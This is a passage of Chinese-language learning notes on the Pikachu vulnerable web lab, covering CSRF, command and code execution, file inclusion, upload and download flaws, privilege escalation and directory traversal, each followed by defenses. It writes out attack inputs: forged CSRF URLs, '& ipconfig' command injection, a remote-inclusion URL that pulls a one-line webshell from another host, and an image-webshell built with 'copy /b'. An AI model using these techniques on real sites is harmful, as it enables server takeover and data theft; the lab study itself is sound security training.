<li><p>对目标网站增删改的地方进行标记观察逻辑判断请求是否可以被伪造</p>
<ul>
<li>如修改管理员账号时不需要验证旧的密码容易导致请求伪造</li>
<li>如对敏感信息修改并没有使用安全的token验证导致请求容易被伪造</li>
</ul>
</li>
<li><p>确认凭证的有效期（这个问题会提高csrf被利用的概率）<br>虽然退出或者关闭了浏览器,但cookie仍然有效，或者session并没有及时过期,导致CSRF攻击变的简单。</p>
</li>
</ol>
<h4 id="scrf（get-post）演示和解析"><a href="#scrf（get-post）演示和解析" class="headerlink" title="scrf（get/post）演示和解析"></a>scrf（get/post）演示和解析</h4><p>csrfget：<br>打开靶场的csrfget，我们假设是lucy登录网站修改信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-11-27.png" alt="登录" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-16-37.png" alt="修改信息" class="lazyload"><br>我们修改信息并抓包查看数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-15-47.png" alt="数据包" class="lazyload"><br>这是我们的请求：GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=usaccca&amp;email=lucy%40pikachu.com&amp;submit=submit 在这里并没有看到csrf的token说明并没有防csrf的措施<br>我们修改请求，将地址修改为shanxi的请求如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs url">http://192.168.23.128/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=shanxi&amp;email=lucy%40pikachu.com&amp;submit=submit<br></code></pre></td></tr></table></figure>

<p>现在只需要将这个地址通过聊天或者信息的方式发送给lucy，lucy进行访问，信息的地址就会更新成shanxi<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-26-24.png" alt="地址更新" class="lazyload"></p>
<p>post型因为是请求体，不能在url中携带参数所以需要和xss的post型类似需要自己弄一个站点做一个表单让lucy点击访问我们恶意站点表单页面，向页面提交post请求<br>post演示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-37-22.png" alt="抓包查看参数信息" class="lazyload"><br>然后我们在服务自己搭建的服务器上搭建一个表单以post方式提交的页面<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-50-55.png" alt="页面" class="lazyload"><br>我们构造一个链接：<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/csrf/post.html">http://192.168.23.128/pikachu/vul/csrf/post.html</a>将他发送给lili，在lili登录的情况下点击了该链接攻击完成<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-52-57.png" alt="攻击完成" class="lazyload"><br>可以看到信息被修改了</p>
<h4 id="反csrf-token"><a href="#反csrf-token" class="headerlink" title="反csrf token"></a>反csrf token</h4><p>csrf的主要问题是敏感操作的链接容易被伪造，只要每次请求都加上一个随机号码（够随机，难伪造）后端每次对这个号码进行检验，这个随机号码就是token，生成token的代码如下<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-12-36-56.png" alt="代码" class="lazyload"></p>
<h4 id="常见CSRF防范措施"><a href="#常见CSRF防范措施" class="headerlink" title="常见CSRF防范措施"></a>常见CSRF防范措施</h4><ul>
<li>增加token验证(常用的做法):</li>
</ul>
<ol>
<li>对关键操作增加token参数，token值必须随机，每次都不一样</li>
</ol>
<ul>
<li>关于安全的会话管理(避免会话被利用) :</li>
</ul>
<ol>
<li>不要在客户端端保存敏感信息(比如身份认证信息)</li>
<li>测试直接关闭，退出时的会话过期机制</li>
<li>设置会话过期机制，比如15分钟内无操作，则自动登录超时</li>
</ol>
<ul>
<li>访问控制安全管理</li>
</ul>
<ol>
<li>敏感信息的修改时需要对身份进行二次认证，比如修改账号时,需要判断旧密码</li>
<li>敏感信息的修改使用post，而不是get</li>
<li>通过http头部中的referer来限制原页面</li>
</ol>
<ul>
<li>增加验证码：一般用在登录(防暴力破解) ,也可以用在其他重要信息操作的表单中(需要考虑可用性)</li>
</ul>
<h3 id="REC（代码-命令执行）"><a href="#REC（代码-命令执行）" class="headerlink" title="REC（代码/命令执行）"></a>REC（代码/命令执行）</h3><p><strong>remote command/code execute（REC）概述：</strong>rec漏洞可以让攻击者直接向后台服务器远程注入操作系统命令或代码直接控制后台系统。<br><strong>远程系统命令执行：</strong>一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口，如常见的路由器、防火请、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。现在很多企业都开始实施自动化运维，大量的系统操作会通过自动化运维平台进行操作， 在这种平台上往往会出现远程系统命令执行的漏洞。<br>远程代码执行同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。<br>打开pikachu靶场exec “ping”我们来尝试一下输入127.0.0.1点击ping<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-23-34.png" alt="尝试" class="lazyload"><br>可以看到出现了命令结果，但结果有乱码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-47-51.png" alt="后端代码" class="lazyload"><br>如果后端没有做严格的过滤我们就可以拼接其他命令进行操作，如输入127.0.0.1 &amp; ipconfig点击ping就可以看到提交目标的IP了，也可以拼接一些其他命令进行尝试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-29-50.png" alt="利用" class="lazyload"></p>
<p>远程代码执行命令<br>打开pikachu的exec “evel”进行尝试：这个更简单随意输入字符串，返回文字。eval（输入）也就是执行任何我们输入的命令如phpinfo();<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-50-28.png" alt="后端代码" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-34-35.png" alt="成功执行" class="lazyload"><br>这里学习一个php函数system(“”)执行外部程序并显示输出。<br>如输入system(“ipconfig”);点击提交成功返回目标IP<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-37-36.png" alt="尝试system函数" class="lazyload"></p>
<p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法</p>
<h3 id="file-inclusion（文件包含漏洞）"><a href="#file-inclusion（文件包含漏洞）" class="headerlink" title="file inclusion（文件包含漏洞）"></a>file inclusion（文件包含漏洞）</h3><h4 id="文件包含原理以及本地文件包含漏洞"><a href="#文件包含原理以及本地文件包含漏洞" class="headerlink" title="文件包含原理以及本地文件包含漏洞"></a>文件包含原理以及本地文件包含漏洞</h4><p><strong>文件包含漏洞概述</strong><br>在web开发时程序员为了让提高效率然代码重复利用率提高，使代码看起啦更简洁，会使用“包含’的函数功能。如：把一些列公用的函数写到function.php中，当其他文件需要相关函数时只需要将function.php在文件头部包含就可以调用相关函数了。但有时因网站功能需求，会让前端用户选择需要包含的文件或者在前端的功能中使用了”包含”功能，又由于开发人员没有对要包含的这个文件进行安全考虑,就导致攻击者可以通过修改包含文件的位置来让后台执行任意文件(代码)。这种情况我们称为”文件包含漏洞”<br>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。<br>文件包含漏洞分为两种本地文件包含漏洞和远程文件包含漏洞<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-16-47.png" alt="文件包含的两种形式" class="lazyload"><br><strong>本地文件包含：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br><strong>远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>在php中可以使用include()或者require()语句包含文件，将一个php文件内容出入到另一个php文件中（在服务器执行它之前）还有include_once()和require_once()函数也可以进行文件包含<br>include和require语句相同除了错误处理方面：<br>require会生成致命错误( E_ COMPILE ERROR )并停止脚本<br>include只生成警告( E WARNING ) ,并且脚本会继续运行</p>
<p><strong>文件包含演示</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-48-42.png" alt="演示" class="lazyload"></p>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><p>打开pikachu靶场的fileinclude本地文件包含，点击下拉列表选择一个提交查询<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-53-28.png" alt="查看地址" class="lazyload"><br>可以看到地址栏显示的是一个文件file5.php按照设计这些文件都是后台自己存在的文件。但是由于这个文件名是前端传向后台的，也就意味着我们可以修改这个文件。我们可以猜测一下后台的操作系统是win11，其中有很多固定的配置文件例如…/…/…/…/…/…/可以多敲几个，最后都会跳到根目录。我们将文件名替换../../../../Windows/System32/drivers/etc/hosts可以看到hosts文件的内容在前端显示了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-57-21.png" alt="包含hosts文件" class="lazyload"></p>
<h4 id="远程文件包含漏洞演示"><a href="#远程文件包含漏洞演示" class="headerlink" title="远程文件包含漏洞演示"></a>远程文件包含漏洞演示</h4><p>远程文件包含漏洞形式跟本地文件包含漏洞差不多,在远程包含漏洞中,攻击者可以通过访问外部地址来加载远程的代码。<br>远程包含漏洞前提:如果使用的incldue和require ,则需要php.ini配置如下：<br>allow_url_fopen=on//默认打开<br>Allow_url_include=on//默认关闭<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-05-52.png" alt="配置" class="lazyload"><br>写入一句话木马危害很大<br>配置好后我们打开靶场，点击一个文件提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-09-07.png" alt="远程文件包含" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-12-58.png" alt="地址特殊处" class="lazyload"><br>看地址栏观察url实际上是提交一个目标文件路径，我们改成一个远端的路径，读取远程文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">http://192.168.23.128/pikachu/test/yijuhua.txt<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-14-25.png" alt="访问" class="lazyload"><br>将靶场链接中的文件替换成远端链接文件(黑客搭建的服务器)修改后的链接如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">http://192.168.23.128/pikachu/vul/fileinclude/fi_remote.php?filename=http://192.168.23.128/pikachu/test/yijuhua.txt&amp;submit=%E6%8F%90%E4%BA%A4<br><br></code></pre></td></tr></table></figure>

<p>我们粘帖访问<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-20-01.png" alt="访问" class="lazyload"><br>会在服务器端的本地当前目录生成一个yijuhua.php传参为x<br>我们访问<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig">http://192.168.23.128/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</a>这个链接就能成功获取到信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-27-09.png" alt="信息" class="lazyload"><br>也可以直接用哥斯拉、冰蝎、中国菜刀等工具直接链接一句话木马拿权限<br><strong>文件包含的防护</strong>在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤</p>
<ul>
<li>在功能设计上尽量不要将文件包含函数对应的文件放给前端进行选择和操作</li>
<li>过滤各种./. ,<a href="http://">http://</a> ，<a href="https://">https://</a></li>
<li>配置php.ini配置文件:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">allow_url fopen = off<br>Allow_ url include= off<br>magic quotes_ gpc=on //魔术引用将单引号反斜杠双引号null字符转义<br></code></pre></td></tr></table></figure>

<ul>
<li>通过白名单策略，仅允许包含运行指定的文件,其他的都禁止</li>
</ul>
<h3 id="Unsafe-file-downloads-不安全的文件下载漏洞"><a href="#Unsafe-file-downloads-不安全的文件下载漏洞" class="headerlink" title="Unsafe file downloads(不安全的文件下载漏洞)"></a>Unsafe file downloads(不安全的文件下载漏洞)</h3><p>很多网站提供文件下载功能，即用户可以通过点击下载链接下载对应文件。但文件下载功能设计的不合理则可能导致攻击者通过构造文件路径从而获取到后台服务器上的其他敏感文件（任意文件下载）<br>打开靶场的不安全的文件下载，正常功能点击球员名字就可以下载图片<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-51-29.png" alt="下载" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-52-35.png" alt="下载图片" class="lazyload"><br>查看下载链接的地址<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/unsafedownload/execdownload.php?filename=rayal.png">http://192.168.23.128/pikachu/vul/unsafedownload/execdownload.php?filename=rayal.png</a>相当于把ai.png传到后台，后台去找这个文件，把文件读取之后，传到前端下载。<br>我们点击科比，将url，改为ai.png<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-56-18.png" alt="ai下载" class="lazyload"><br>结果是下载了ai.png<br>我们还可以使用目录遍历的方式去修改链接下载敏感文件。<br><strong>防范措施：</strong></p>
<ol>
<li>对传入的文件名进行严格的过滤和限定</li>
<li>对文件下载的目录进行严格的限定</li>
</ol>
<h3 id="Unsafe-file-uploads-不安全的文件上传"><a href="#Unsafe-file-uploads-不安全的文件上传" class="headerlink" title="Unsafe file uploads(不安全的文件上传)"></a>Unsafe file uploads(不安全的文件上传)</h3><p>由于业务功能的需求很多网站都有文件上传的接口：</p>
<ol>
<li>注册时上传头像图片(如jpg、png、gif等)</li>
<li>上传文件附件(如doc、xls等)<br>如果后端开发时并没有对上传文件功能进行安全考虑或者采用有缺陷的措施导致攻击者可以通过某些手段绕过安全措施上传一些恶意文件（一句话木马）导致网站权限被获取</li>
</ol>
<p><strong>文件上传漏洞的测试流程</strong></p>
<ol>
<li>对文件上传的地方按照要求上传文件，查看返回结果(路径和提示等)</li>
<li>尝试上传不同类型的恶意文件，如xx.php文件分析结果</li>
<li>查看html源码，看是否在前端通过js做了限制可以绕过</li>
<li>尝试不同方式进行绕过:黑名单绕过、mime类型绕过、目录0x00截断绕过等</li>
<li>猜测或者结合其他漏洞（如敏感信息泄露等）得到木马路径链接测试</li>
</ol>
<p>打开靶场unsafe upfileupload客户端check我们浏览上传文件发现只能上传照片<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-30-03.png" alt="靶场" class="lazyload"><br>我们上传一个php脚本会提示上传文件不符合要求<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-33-16.png" alt="提示" class="lazyload"><br>上传其他类型的文件会被前端提示，有可能这个限制是前端实现的，打开源码查看<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-52-32.png" alt="源码" class="lazyload"><br>发现果然进行了限制，修改前端代码直接删除onchange的函数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-55-24.png" alt="修改前端代码" class="lazyload"><br>继续上传php文件点击提交结果还是提示文件类型不符合要求，在网上查找发现可以通过禁用网站的javascript来绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-28-40.png" alt="设置" class="lazyload"><br>选择脚本文件并上传<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-29-34.png" alt="上传脚本" class="lazyload">、<br>成功并且提示出上传路径，php文件一句话木马成功上传。之后就可以给特定值传命令，执行操作。</p>
<h4 id="文件上传漏洞之MINE-type验证原理"><a href="#文件上传漏洞之MINE-type验证原理" class="headerlink" title="文件上传漏洞之MINE type验证原理"></a>文件上传漏洞之MINE type验证原理</h4><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。常见的MIME类型，比如:<br>超文本标记语言文本.html.html texthtml<br>普通文本.txt text/plain<br>RTF文本.rtf application/rtf<br>GIF图形.gif image/gif<br>JPEG图形.ipeg.jpg image/jpeg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">通过使用PHP的全局数组$_ FILES ,你可以从客户计算机向远程服务器上传文件。<br>第一个参数是表单的input name，第二个下标可以是”name”, “type”, “size”, “tmp_ name” 或”error”<br></code></pre></td></tr></table></figure>

<p>同样先测试功能，上传图片没有问题，点击上传php文件提示出错<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-37-21.png" alt="上传" class="lazyload"><br>我们上传一个正常图片，然后在上传一个php文件，并且用burp抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-41-56.png" alt="上传的数据包" class="lazyload"><br>上传图片显示上传成功，上传php文件失败，content-type显示的值不同我们将上传php文件的数据包发送到repeater中并将content-type的值改成图片的点击go<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-47-46.png" alt="修改数据包" class="lazyload"><br>文件上传成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-49-47.png" alt="成功绕过" class="lazyload"><br>通过http头的修改绕过了MINE type验证成功乱搞。之后就是访问传参，通过一句话木马控制服务器。</p>
<h4 id="文件上传之getimagesize绕过和防范"><a href="#文件上传之getimagesize绕过和防范" class="headerlink" title="文件上传之getimagesize绕过和防范"></a>文件上传之getimagesize绕过和防范</h4><p>Getimagesize()返回结果中有文件大小和文件类型,如果用这个函数来获取类型，从而判断是否是图片会存在问题<br>是否可以绕过？可以，图片头可以被伪造(图片马)<br>图片马的制作：</p>
<ul>
<li>直接伪造头部gif89A</li>
<li>cmd：copy /b test.jpg + muma.php ccc.phg</li>
<li>使用010edit神器或开源修图工具十六进制写入图片头，通过增加备注,写入执行命令</li>
</ul>
<p>制作图片马这里采用最简单的第二种方法：<br>cmd进入桌面，输入命令dir保证可以找到相关文件：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-32-20.png" alt="制作图片马" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-33-09.png" alt="图片马" class="lazyload"><br>打开展示无问题，但在图片16进制中添加了一句话木马，上传到靶场<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-34-53.png" alt="上传" class="lazyload"><br>可以看到上传成功，但我们访问并没有执行一句话，这时候就要结合本地文件包含漏洞来使用，打开文件包含漏洞file include，上传图片，修改路径，就可以执行phpinfo命令了<br>打开本地文件包含构造链接<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/03/12/660584640dbf7f8f024953420498.jpg&amp;submit=%E6%8F%90%E4%BA%A4">http://192.168.23.128/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/03/12/660584640dbf7f8f024953420498.jpg&amp;submit=%E6%8F%90%E4%BA%A4</a>访问会在当前目录生成shell.php然后访问执行代码，或者直接菜刀访问。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-06-02.png" alt="成功利用" class="lazyload"><br>命令成功执行</p>
<h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><p>不要在前端使用JS实施上传限制策略，通过服务端对上传文件进行限制:</p>
<ul>
<li>进行多条件组合检查:比如文件的大小，路径，扩展名,文件类型，文件完整性</li>
<li>对上传的文件在服务器上存储时进行重命名(制定合理的命名规则)</li>
<li>对服务器端上传文件的目录进行权限控制(比如只读)， 限制执行权限带来的危害</li>
</ul>
<h3 id="Over-Permisson（越权漏洞）"><a href="#Over-Permisson（越权漏洞）" class="headerlink" title="Over Permisson（越权漏洞）"></a>Over Permisson（越权漏洞）</h3><h4 id="越权漏洞原理"><a href="#越权漏洞原理" class="headerlink" title="越权漏洞原理"></a>越权漏洞原理</h4><p><strong>越权漏洞概述</strong><br>由于没有用户权限的严格判断，导致低权限账号（普通用户）可以去完成高权限账号（如后台管理员）范围内的操作<br><strong>平行越权：</strong>A用户和B用户同一级别用户，但各自不能操作对方的个人信息，A越权操做B的信息的情况成为平行越权<br><strong>垂直越权：</strong>A用户权限高于B用户，B用户越权操作A的权限成为垂直越权<br>越权漏洞属于逻辑漏洞，是由于权限检验的逻辑不够严谨导致<br>越权漏洞很难通过工具扫描出来只能进行手工测试</p>
<h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>先登录，提示里查看账号密码，有一个查看个人信息的按钮<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-33-03.png" alt="登录水平越权" class="lazyload"><br>再点击按钮时，向后台提供了一个get请求。提供了当前用户的用户名，然后后台将其信息返回到前台。我们在url中把Lucy改成其他人看看能不能查到信息。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-35-36.png" alt="水平越权" class="lazyload"></p>
<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>先登录超级管理员，去执行只有超级管理员才可以操作的新增账号的功能，用burp抓包。退出登录，登录普通用户，执行新增账号操作如果成功则存在垂直越权漏洞。<br>垂直越权演示流程：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-21-43-22.png" alt="垂直越权流程" class="lazyload"></p>
<h3 id="…-…-…-目录遍历"><a href="#…-…-…-目录遍历" class="headerlink" title="…/…/…/(目录遍历)"></a>…/…/…/(目录遍历)</h3><p><strong>目录遍历漏洞</strong>在web功能设计中很多时候我们会将要访问的文件定义成变量让前端的功能更灵活，当用户发起一个前端请求，便会将这个文件的值（如文件名）传递到后端，后端在执行对应的文件。在这个过程中如果没有对前端传来的值进行严格的安全考虑则攻击者可能会通过”../“这种方式让后台打开或者执行一些其他的文件，从而导致后端服务器上的其他目录文件结果被遍历出，形成目录遍历。<br>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。<br>需要区分一下的是,如果你通过不带参数的url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc">http://xxxx/doc</a>）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多）<br>目录遍历漏洞演示：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-28-34.png" alt="目录遍历" class="lazyload"></p>
<h3 id="敏感信息泄露（can-see-your-ABC）"><a href="#敏感信息泄露（can-see-your-ABC）" class="headerlink" title="敏感信息泄露（can see your ABC）"></a>敏感信息泄露（can see your ABC）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>---通过访问url下的目录，可以直接列出目录下的文件列表;<br>---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;<br>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。<br></code></pre></td></tr></table></figure>

